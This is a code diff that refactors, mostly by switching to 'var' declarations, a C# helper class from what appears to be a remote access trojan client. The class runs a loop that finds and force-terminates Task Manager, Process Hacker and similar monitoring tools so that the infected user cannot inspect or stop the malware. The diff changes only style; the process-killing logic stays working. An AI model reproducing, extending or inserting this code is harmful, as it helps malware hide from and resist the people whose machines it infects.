@@ -27,7 +27,9 @@ namespace Client.Helper
                 BlockThread.Abort();
                 BlockThread = new Thread(Block);
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         //Check to kill processes in a loop
@@ -35,14 +37,14 @@ namespace Client.Helper
         {
             while (Enabled)
             {
-                IntPtr snapshot = CreateToolhelp32Snapshot(0x00000002u, 0u);
-                PROCESSENTRY32 entry = new PROCESSENTRY32();
-                entry.dwSize = (uint) Marshal.SizeOf(typeof(PROCESSENTRY32));
+                var snapshot = CreateToolhelp32Snapshot(0x00000002u, 0u);
+                var entry = new PROCESSENTRY32();
+                entry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
                 if (Process32First(snapshot, ref entry))
                     do
                     {
-                        uint id = entry.th32ProcessID;
-                        string name = entry.szExeFile;
+                        var id = entry.th32ProcessID;
+                        var name = entry.szExeFile;
 
                         if (Matches(name, "Taskmgr.exe") ||
                             Matches(name, "ProcessHacker.exe") ||
@@ -74,7 +76,7 @@ namespace Client.Helper
         //Kill process 
         private static void KillProcess(uint processId)
         {
-            IntPtr process = OpenProcess(0x0001u, false, processId);
+            var process = OpenProcess(0x0001u, false, processId);
             TerminateProcess(process, 0);
             CloseHandle(process);
         }
